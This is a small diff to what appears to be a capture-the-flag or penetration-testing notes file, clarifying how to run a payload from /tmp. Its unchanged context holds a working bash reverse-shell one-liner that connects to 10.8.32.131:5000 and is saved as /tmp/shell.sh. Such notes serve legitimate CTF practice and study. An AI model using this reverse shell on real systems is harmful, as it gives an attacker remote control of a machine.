@@ -140,8 +140,8 @@ But you can also exploit the registration form where the "Username already exist
       
 - **Metasploit**: sometimes banned from CTF environments
 
-In case not working, this is because you are in a non executable folder. Try to change folder to `/tmp` and create a bash script:
-
+In case not working, this is because you are in a non executable folder. Try to change folder to `/tmp` and create a bash script (also with execution permission):
+      
       echo "bash -c 'bash -i >& /dev/tcp/10.8.32.131/5000 0>&1'" > /tmp/shell.sh
       
       Then:
